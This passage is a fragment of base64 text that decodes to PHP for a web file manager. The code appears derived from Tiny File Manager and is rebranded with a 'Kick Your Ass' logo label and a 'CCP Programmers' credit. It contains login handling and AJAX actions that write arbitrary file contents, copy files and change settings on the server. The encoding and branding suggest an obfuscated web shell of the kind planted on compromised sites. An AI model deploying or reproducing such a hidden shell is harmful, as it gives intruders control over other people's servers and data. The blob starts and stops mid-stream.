3Nob3dfbWVzc2FnZSgpOw0KICAgICAgICB9DQogICAgICAgIGV4aXQoKTsNCiAgICB9DQp9DQoNCi8vIENoZWNraW5nIGlmIHRoZSB1c2VyIGlzIGxvZ2dlZCBpbiBvciBub3QuIElmIG5vdCwgaXQgd2lsbCBzaG93IHRoZSBsb2dpbiBmb3JtLg0KaWYgKCR1c2VfYXV0aCkgew0KICAgIGlmIChpc3NldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddLCAkYXV0aF91c2Vyc1skX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddXSkpIHsNCiAgICAgICAgLy8gTG9nZ2VkDQogICAgfSBlbHNlaWYgKGlzc2V0KCRfUE9TVFsnZm1fdXNyJ10sICRfUE9TVFsnZm1fcHdkJ10sICRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgLy8gTG9nZ2luZyBJbg0KICAgICAgICBzbGVlcCgxKTsNCiAgICAgICAgaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzd29yZF92ZXJpZnknKSkgew0KICAgICAgICAgICAgaWYgKGlzc2V0KCRhdXRoX3VzZXJzWyRfUE9TVFsnZm1fdXNyJ11dKSAmJiBpc3NldCgkX1BPU1RbJ2ZtX3B3ZCddKSAmJiBwYXNzd29yZF92ZXJpZnkoJF9QT1NUWydmbV9wd2QnXSwgJGF1dGhfdXNlcnNbJF9QT1NUWydmbV91c3InXV0pICYmIHZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgICAgICAgICAkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddID0gJF9QT1NUWydmbV91c3InXTsNCiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKGxuZygnWW91IGFyZSBsb2dnZWQgaW4nKSk7DQogICAgICAgICAgICAgICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICB1bnNldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddKTsNCiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKGxuZygnTG9naW4gZmFpbGVkLiBJbnZhbGlkIHVzZXJuYW1lIG9yIHBhc3N3b3JkJyksICdlcnJvcicpOw0KICAgICAgICAgICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdwYXNzd29yZF9oYXNoIG5vdCBzdXBwb3J0ZWQsIFVwZ3JhZGUgUEhQIHZlcnNpb24nKSwgJ2Vycm9yJyk7Ow0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgLy8gRm9ybQ0KICAgICAgICB1bnNldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddKTsNCiAgICAgICAgZm1fc2hvd19oZWFkZXJfbG9naW4oKTsNCiAgICAgICAgPz4NCiAgICAgICAgPHNlY3Rpb24gY2xhc3M9ImgtMTAwIj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciBoLTEwMCI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IGp1c3RpZnktY29udGVudC1tZC1jZW50ZXIgaC0xMDAiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLXdyYXBwZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBmYXQgPD9waHAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGNsYXNzPSJmb3JtLXNpZ25pbiIgYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgYXV0b2NvbXBsZXRlPSJvZmYiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWItMyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJicmFuZCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzdmcgdmVyc2lvbj0iMS4wIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIE0xMDA4IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjgwcHgiIHZpZXdCb3g9IjAgMCAyMzguMDAwMDAwIDE0MC4wMDAwMDAiIGFyaWEtbGFiZWw9IktpY2sgWW91ciBBc3MiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC4wMDAwMDAsMTQwLjAwMDAwMCkgc2NhbGUoMC4xMDAwMDAsLTAuMTAwMDAwKSIgZmlsbD0iIzAwMDAwMCIgc3Ryb2tlPSJub25lIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMTYwIDcwMCBsMCAtNjAwIDExMCAwIDExMCAwIDAgMjYwIDAgMjYwIDcwIDAgNzAgMCAwIC0yNjAgMCAtMjYwIDExMCAwIDExMCAwIDAgNjAwIDAgNjAwIC0xMTAgMCAtMTEwIDAgMCAtMjYwIDAgLTI2MCAtNzAgMCAtNzAgMCAwIDI2MCAwIDI2MCAtMTEwIDAgLTExMCAwIDAgLTYwMHoiLz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cGF0aCBmaWxsPSIjMDAzNTAwIiBkPSJNMTAwOCAxMjI3IGwtMTA4IC03MiAwIC0xMTcgMCAtMTE4IDExMCAwIDExMCAwIDAgMTEwIDAgMTEwIDcwIDAgNzAgMCAwIC0xODAgMCAtMTgwIC0xMjUgMCBjLTY5IDAgLTEyNSAtMyAtMTI1IC02IDAgLTMgMjMgLTM5IDUyIC04MCBsNTIgLTc0IDczIDAgNzMgMCAwIC0xODUgMCAtMTg1IC03MCAwIC03MCAwIDAgMTE1IDAgMTE1IC0xMTAgMCAtMTEwIDAgMCAtMTkwIDAgLTE5MCAxODEgMCAxODEgMCAxMDkgNzMgMTA4IDcyIDEgMTgxIDAgMTgxIC02OSA0OCAtNjggNDkgNjggNTAgNjkgNDkgMCAyNDkgMCAyNDggLTE4MiAtMSAtMTgzIDAgLTEwNyAtNzJ6Ii8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHBhdGggZD0iTTE2NDAgNzAwIGwwIC02MDAgMTEwIDAgMTEwIDAgMCAyMDggMCAyMDggMzUgMzQgMzUgMzQgMzUgLTM0IDM1IC0zNCAwIC0yMDggMCAtMjA4IDExMCAwIDExMCAwIDAgMjEyIDAgMjEzIC04NyA4NyAtODggODggODggODggODcgODcgMCAyMTMgMCAyMTIgLTExMCAwIC0xMTAgMCAwIC0yMDggMCAtMjA4IC03MCAtNjkgLTcwIC02OSAwIDI3NyAwIDI3NyAtMTEwIDAgLTExMCAwIDAgLTYwMHoiLz48L2c+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc3ZnPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRleHQtY2VudGVyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGgxIGNsYXNzPSJjYXJkLXRpdGxlIj48P3BocCBlY2hvIEFQUF9USVRMRTsgPz48L2gxPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aHIgLz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImZtX3VzciIgY2xhc3M9InBiLTIiPjw/cGhwIGVjaG8gbG5nKCdVc2VybmFtZScpOyA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJmbV91c3IiIG5hbWU9ImZtX3VzciIgcmVxdWlyZWQgYXV0b2ZvY3VzPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImZtX3B3ZCIgY2xhc3M9InBiLTIiPjw/cGhwIGVjaG8gbG5nKCdQYXNzd29yZCcpOyA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0iZm1fcHdkIiBuYW1lPSJmbV9wd2QiIHJlcXVpcmVkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGZtX3Nob3dfbWVzc2FnZSgpOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbGVudGl0aWVzKCRfU0VTU0lPTlsndG9rZW4nXSk7ID8+IiAvPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWItMyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MgYnRuLWJsb2NrIHctMTAwIG10LTQiIHJvbGU9ImJ1dHRvbiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVjaG8gbG5nKCdMb2dpbicpOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9vdGVyIHRleHQtY2VudGVyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAmbWRhc2g7Jm1kYXNoOyAmY29weTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL3RpbnlmaWxlbWFuYWdlci5naXRodWIuaW8vIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9InRleHQtZGVjb3JhdGlvbi1ub25lIHRleHQtbXV0ZWQiIGRhdGEtdmVyc2lvbj0iPD9waHAgZWNobyBWRVJTSU9OOyA/PiI+Q0NQIFByb2dyYW1tZXJzPC9hPiAmbWRhc2g7Jm1kYXNoOw0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvc2VjdGlvbj4NCg0KICAgICAgICA8P3BocA0KICAgICAgICBmbV9zaG93X2Zvb3Rlcl9sb2dpbigpOw0KICAgICAgICBleGl0Ow0KICAgIH0NCn0NCg0KLy8gdXBkYXRlIHJvb3QgcGF0aA0KaWYgKCR1c2VfYXV0aCAmJiBpc3NldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddKSkgew0KICAgICRyb290X3BhdGggPSBpc3NldCgkZGlyZWN0b3JpZXNfdXNlcnNbJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXV0pID8gJGRpcmVjdG9yaWVzX3VzZXJzWyRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ11dIDogJHJvb3RfcGF0aDsNCn0NCg0KLy8gY2xlYW4gYW5kIGNoZWNrICRyb290X3BhdGgNCiRyb290X3BhdGggPSBydHJpbSgkcm9vdF9wYXRoLCAnXFwvJyk7DQokcm9vdF9wYXRoID0gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCAkcm9vdF9wYXRoKTsNCmlmICghQGlzX2Rpcigkcm9vdF9wYXRoKSkgew0KICAgIGVjaG8gIjxoMT4iLmxuZygnUm9vdCBwYXRoJykuIiBcInskcm9vdF9wYXRofVwiICIubG5nKCdub3QgZm91bmQhJykuIiA8L2gxPiI7DQogICAgZXhpdDsNCn0NCg0KZGVmaW5lZCgnRk1fU0hPV19ISURERU4nKSB8fCBkZWZpbmUoJ0ZNX1NIT1dfSElEREVOJywgJHNob3dfaGlkZGVuX2ZpbGVzKTsNCmRlZmluZWQoJ0ZNX1JPT1RfUEFUSCcpIHx8IGRlZmluZSgnRk1fUk9PVF9QQVRIJywgJHJvb3RfcGF0aCk7DQpkZWZpbmVkKCdGTV9MQU5HJykgfHwgZGVmaW5lKCdGTV9MQU5HJywgJGxhbmcpOw0KZGVmaW5lZCgnRk1fRklMRV9FWFRFTlNJT04nKSB8fCBkZWZpbmUoJ0ZNX0ZJTEVfRVhURU5TSU9OJywgJGFsbG93ZWRfZmlsZV9leHRlbnNpb25zKTsNCmRlZmluZWQoJ0ZNX1VQTE9BRF9FWFRFTlNJT04nKSB8fCBkZWZpbmUoJ0ZNX1VQTE9BRF9FWFRFTlNJT04nLCAkYWxsb3dlZF91cGxvYWRfZXh0ZW5zaW9ucyk7DQpkZWZpbmVkKCdGTV9FWENMVURFX0lURU1TJykgfHwgZGVmaW5lKCdGTV9FWENMVURFX0lURU1TJywgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzcuMC4wJywgJzwnKSA/IHNlcmlhbGl6ZSgkZXhjbHVkZV9pdGVtcykgOiAkZXhjbHVkZV9pdGVtcykpOw0KZGVmaW5lZCgnRk1fRE9DX1ZJRVdFUicpIHx8IGRlZmluZSgnRk1fRE9DX1ZJRVdFUicsICRvbmxpbmVfdmlld2VyKTsNCmRlZmluZSgnRk1fUkVBRE9OTFknLCAkZ2xvYmFsX3JlYWRvbmx5IHx8ICgkdXNlX2F1dGggJiYgIWVtcHR5KCRyZWFkb25seV91c2VycykgJiYgaXNzZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXSkgJiYgaW5fYXJyYXkoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXSwgJHJlYWRvbmx5X3VzZXJzKSkpOw0KZGVmaW5lKCdGTV9JU19XSU4nLCBESVJFQ1RPUllfU0VQQVJBVE9SID09ICdcXCcpOw0KDQovLyBhbHdheXMgdXNlID9wPQ0KaWYgKCFpc3NldCgkX0dFVFsncCddKSAmJiBlbXB0eSgkX0ZJTEVTKSkgew0KICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScpOw0KfQ0KDQovLyBnZXQgcGF0aA0KJHAgPSBpc3NldCgkX0dFVFsncCddKSA/ICRfR0VUWydwJ10gOiAoaXNzZXQoJF9QT1NUWydwJ10pID8gJF9QT1NUWydwJ10gOiAnJyk7DQoNCi8vIGNsZWFuIHBhdGgNCiRwID0gZm1fY2xlYW5fcGF0aCgkcCk7DQoNCi8vIGZvciBhamF4IHJlcXVlc3QgLSBzYXZlDQokaW5wdXQgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsNCiRfUE9TVCA9IChzdHJwb3MoJGlucHV0LCAnYWpheCcpICE9IEZBTFNFICYmIHN0cnBvcygkaW5wdXQsICdzYXZlJykgIT0gRkFMU0UpID8ganNvbl9kZWNvZGUoJGlucHV0LCB0cnVlKSA6ICRfUE9TVDsNCg0KLy8gaW5zdGVhZCBnbG9iYWxzIHZhcnMNCmRlZmluZSgnRk1fUEFUSCcsICRwKTsNCmRlZmluZSgnRk1fVVNFX0FVVEgnLCAkdXNlX2F1dGgpOw0KZGVmaW5lKCdGTV9FRElUX0ZJTEUnLCAkZWRpdF9maWxlcyk7DQpkZWZpbmVkKCdGTV9JQ09OVl9JTlBVVF9FTkMnKSB8fCBkZWZpbmUoJ0ZNX0lDT05WX0lOUFVUX0VOQycsICRpY29udl9pbnB1dF9lbmNvZGluZyk7DQpkZWZpbmVkKCdGTV9VU0VfSElHSExJR0hUSlMnKSB8fCBkZWZpbmUoJ0ZNX1VTRV9ISUdITElHSFRKUycsICR1c2VfaGlnaGxpZ2h0anMpOw0KZGVmaW5lZCgnRk1fSElHSExJR0hUSlNfU1RZTEUnKSB8fCBkZWZpbmUoJ0ZNX0hJR0hMSUdIVEpTX1NUWUxFJywgJGhpZ2hsaWdodGpzX3N0eWxlKTsNCmRlZmluZWQoJ0ZNX0RBVEVUSU1FX0ZPUk1BVCcpIHx8IGRlZmluZSgnRk1fREFURVRJTUVfRk9STUFUJywgJGRhdGV0aW1lX2Zvcm1hdCk7DQoNCnVuc2V0KCRwLCAkdXNlX2F1dGgsICRpY29udl9pbnB1dF9lbmNvZGluZywgJHVzZV9oaWdobGlnaHRqcywgJGhpZ2hsaWdodGpzX3N0eWxlKTsNCg0KLyoqKioqKioqKioqKioqKioqKioqKioqKioqKiBBQ1RJT05TICoqKioqKioqKioqKioqKioqKioqKioqKioqKi8NCg0KLy8gSGFuZGxlIGFsbCBBSkFYIFJlcXVlc3QNCmlmICgoaXNzZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXSwgJGF1dGhfdXNlcnNbJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXV0pIHx8ICFGTV9VU0VfQVVUSCkgJiYgaXNzZXQoJF9QT1NUWydhamF4J10sICRfUE9TVFsndG9rZW4nXSkgJiYgIUZNX1JFQURPTkxZKSB7DQogICAgaWYoIXZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgaGVhZGVyKCdIVFRQLzEuMCA0MDEgVW5hdXRob3JpemVkJyk7DQogICAgICAgIGRpZSgiSW52YWxpZCBUb2tlbi4iKTsNCiAgICB9DQoNCiAgICAvL3NlYXJjaCA6IGdldCBsaXN0IG9mIGZpbGVzIGZyb20gdGhlIGN1cnJlbnQgZm9sZGVyDQogICAgaWYoaXNzZXQoJF9QT1NUWyd0eXBlJ10pICYmICRfUE9TVFsndHlwZSddPT0ic2VhcmNoIikgew0KICAgICAgICAkZGlyID0gJF9QT1NUWydwYXRoJ10gPT0gIi4iID8gJyc6ICRfUE9TVFsncGF0aCddOw0KICAgICAgICAkcmVzcG9uc2UgPSBzY2FuKGZtX2NsZWFuX3BhdGgoJGRpciksICRfUE9TVFsnY29udGVudCddKTsNCiAgICAgICAgZWNobyBqc29uX2VuY29kZSgkcmVzcG9uc2UpOw0KICAgICAgICBleGl0KCk7DQogICAgfQ0KDQogICAgLy8gc2F2ZSBlZGl0b3IgZmlsZQ0KICAgIGlmIChpc3NldCgkX1BPU1RbJ3R5cGUnXSkgJiYgJF9QT1NUWyd0eXBlJ10gPT0gInNhdmUiKSB7DQogICAgICAgIC8vIGdldCBjdXJyZW50IHBhdGgNCiAgICAgICAgJHBhdGggPSBGTV9ST09UX1BBVEg7DQogICAgICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KICAgICAgICB9DQogICAgICAgIC8vIGNoZWNrIHBhdGgNCiAgICAgICAgaWYgKCFpc19kaXIoJHBhdGgpKSB7DQogICAgICAgICAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nKTsNCiAgICAgICAgfQ0KICAgICAgICAkZmlsZSA9ICRfR0VUWydlZGl0J107DQogICAgICAgICRmaWxlID0gZm1fY2xlYW5fcGF0aCgkZmlsZSk7DQogICAgICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGZpbGUpOw0KICAgICAgICBpZiAoJGZpbGUgPT0gJycgfHwgIWlzX2ZpbGUoJHBhdGggLiAnLycgLiAkZmlsZSkpIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdGaWxlIG5vdCBmb3VuZCcpLCAnZXJyb3InKTsNCiAgICAgICAgICAgICRGTV9QQVRIPUZNX1BBVEg7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICAgICAgfQ0KICAgICAgICBoZWFkZXIoJ1gtWFNTLVByb3RlY3Rpb246MCcpOw0KICAgICAgICAkZmlsZV9wYXRoID0gJHBhdGggLiAnLycgLiAkZmlsZTsNCg0KICAgICAgICAkd3JpdGVkYXRhID0gJF9QT1NUWydjb250ZW50J107DQogICAgICAgICRmZCA9IGZvcGVuKCRmaWxlX3BhdGgsICJ3Iik7DQogICAgICAgICR3cml0ZV9yZXN1bHRzID0gQGZ3cml0ZSgkZmQsICR3cml0ZWRhdGEpOw0KICAgICAgICBmY2xvc2UoJGZkKTsNCiAgICAgICAgaWYgKCR3cml0ZV9yZXN1bHRzID09PSBmYWxzZSl7DQogICAgICAgICAgICBoZWFkZXIoIkhUVFAvMS4xIDUwMCBJbnRlcm5hbCBTZXJ2ZXIgRXJyb3IiKTsNCiAgICAgICAgICAgIGRpZSgiQ291bGQgTm90IFdyaXRlIEZpbGUhIC0gQ2hlY2sgUGVybWlzc2lvbnMgLyBPd25lcnNoaXAiKTsNCiAgICAgICAgfQ0KICAgICAgICBkaWUodHJ1ZSk7DQogICAgfQ0KDQogICAgLy8gYmFja3VwIGZpbGVzDQogICAgaWYgKGlzc2V0KCRfUE9TVFsndHlwZSddKSAmJiAkX1BPU1RbJ3R5cGUnXSA9PSAiYmFja3VwIiAmJiAhZW1wdHkoJF9QT1NUWydmaWxlJ10pKSB7DQogICAgICAgICRmaWxlTmFtZSA9IGZtX2NsZWFuX3BhdGgoJF9QT1NUWydmaWxlJ10pOw0KICAgICAgICAkZnVsbFBhdGggPSBGTV9ST09UX1BBVEggLiAnLyc7DQogICAgICAgIGlmICghZW1wdHkoJF9QT1NUWydwYXRoJ10pKSB7DQogICAgICAgICAgICAkcmVsYXRpdmVEaXJQYXRoID0gZm1fY2xlYW5fcGF0aCgkX1BPU1RbJ3BhdGgnXSk7DQogICAgICAgICAgICAkZnVsbFBhdGggLj0gInskcmVsYXRpdmVEaXJQYXRofS8iOw0KICAgICAgICB9DQogICAgICAgICRkYXRlID0gZGF0ZSgiZE15LUhpcyIpOw0KICAgICAgICAkbmV3RmlsZU5hbWUgPSAieyRmaWxlTmFtZX0teyRkYXRlfS5iYWsiOw0KICAgICAgICAkZnVsbHlRdWFsaWZpZWRGaWxlTmFtZSA9ICRmdWxsUGF0aCAuICRmaWxlTmFtZTsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghZmlsZV9leGlzdHMoJGZ1bGx5UXVhbGlmaWVkRmlsZU5hbWUpKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiRmlsZSB7JGZpbGVOYW1lfSBub3QgZm91bmQiKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChjb3B5KCRmdWxseVF1YWxpZmllZEZpbGVOYW1lLCAkZnVsbFBhdGggLiAkbmV3RmlsZU5hbWUpKSB7DQogICAgICAgICAgICAgICAgZWNobyAiQmFja3VwIHskbmV3RmlsZU5hbWV9IGNyZWF0ZWQiOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCJDb3VsZCBub3QgY29weSBmaWxlIHskZmlsZU5hbWV9Iik7DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgew0KICAgICAgICAgICAgZWNobyAkZS0+Z2V0TWVzc2FnZSgpOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgLy8gU2F2ZSBDb25maWcNCiAgICBpZiAoaXNzZXQoJF9QT1NUWyd0eXBlJ10pICYmICRfUE9TVFsndHlwZSddID09ICJzZXR0aW5ncyIpIHsNCiAgICAgICAgZ2xvYmFsICRjZmcsICRsYW5nLCAkcmVwb3J0X2Vycm9ycywgJHNob3dfaGlkZGVuX2ZpbGVzLCAkbGFuZ19saXN0LCAkaGlkZV9Db2xzLCAkdGhlbWU7DQogICAgICAgICRuZXdMbmcgPSAkX1BPU1RbJ2pzLWxhbmd1YWdlJ107DQogICAgICAgIGZtX2dldF90cmFuc2xhdGlvbnMoW10pOw0KICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoJG5ld0xuZywgJGxhbmdfbGlzdCkpIHsNCiAgICAgICAgICAgICRuZXdMbmcgPSAnZW4nOw0KICAgICAgICB9DQoNCiAgICAgICAgJGVycCA9IGlzc2V0KCRfUE9TVFsnanMtZXJyb3ItcmVwb3J0J10pICYmICRfUE9TVFsnanMtZXJyb3ItcmVwb3J0J10gPT0gInRydWUiID8gdHJ1ZSA6IGZhbHNlOw0KICAgICAgICAkc2hmID0gaXNzZXQoJF9QT1NUWydqcy1zaG93LWhpZGRlbiddKSAmJiAkX1BPU1RbJ2pzLXNob3ctaGlkZGVuJ10gPT0gInRydWUiID8gdHJ1ZSA6IGZhbHNlOw0KICAgICAgICAkaGNvID0gaXNzZXQoJF9QT1NUWydqcy1oaWRlLWNvbHMnXSkgJiYgJF9QT1NUWydqcy1oaWRlLWNvbHMnXSA9PSAidHJ1ZSIgPyB0cnVlIDogZmFsc2U7DQogICAgICAgICR0ZTMgPSAkX1BPU1RbJ2pzLXRoZW1lLTMnXTsNCg0KICAgICAgICBpZiAoJGNmZy0+ZGF0YVsnbGFuZyddICE9ICRuZXdMbmcpIHsNCiAgICAgICAgICAgICRjZmctPmRhdGFbJ2xhbmcnXSA9ICRuZXdMbmc7DQogICAgICAgICAgICAkbGFuZyA9ICRuZXdMbmc7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRjZmctPmRhdGFbJ2Vycm9yX3JlcG9ydGluZyddICE9ICRlcnApIHsNCiAgICAgICAgICAgICRjZmctPmRhdGFbJ2Vycm9yX3JlcG9ydGluZyddID0gJGVycDsNCiAgICAgICAgICAgICRyZXBvcnRfZXJyb3JzID0gJGVycDsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGNmZy0+ZGF0YVsnc2hvd19oaWRkZW4nXSAhPSAkc2hmKSB7DQogICAgICAgICAgICAkY2ZnLT5kYXRhWydzaG93X2hpZGRlbiddID0gJHNoZjsNCiAgICAgICAgICAgICRzaG93X2hpZGRlbl9maWxlcyA9ICRzaGY7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRjZmctPmRhdGFbJ3Nob3dfaGlkZGVuJ10gIT0gJHNoZikgew0KICAgICAgICAgICAgJGNmZy0+ZGF0YVsnc2hvd19oaWRkZW4nXSA9ICRzaGY7DQogICAgICAgICAgICAkc2hvd19oaWRkZW5fZmlsZXMgPSAkc2hmOw0KICAgICAgICB9DQogICAgICAgIGlmICgkY2ZnLT5kYXRhWydoaWRlX0NvbHMnXSAhPSAkaGNvKSB7DQogICAgICAgICAgICAkY2ZnLT5kYXRhWydoaWRlX0NvbHMnXSA9ICRoY287DQogICAgICAgICAgICAkaGlkZV9Db2xzID0gJGhjbzsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGNmZy0+ZGF0YVsndGhlbWUnXSAhPSAkdGUzKSB7DQogICAgICAgICAgICAkY2ZnLT5kYXRhWyd0aGVtZSddID0gJHRlMzsNCiAgICAgICAgICAgICR0aGVtZSA9ICR0ZTM7DQogICAgICAgIH0NCiAgICAgICAgJGNmZy0+c2F2ZSgpOw0KICAgICAgICBlY2hvIHRydWU7DQogICAgfQ0KDQogICAgLy8gbmV3IHBhc3N3b3JkIGhhc2gNCiAgICBpZiAoaXNzZXQoJF9QT1NUWyd0eXBlJ10pICYmICRfUE9TVFsndHlwZSddID09ICJwd2RoYXNoIikgew0KICAgICAgICAkcmVzID0gaXNzZXQoJF9QT1NUWydpbnB1dFBhc3N3b3JkMiddKSA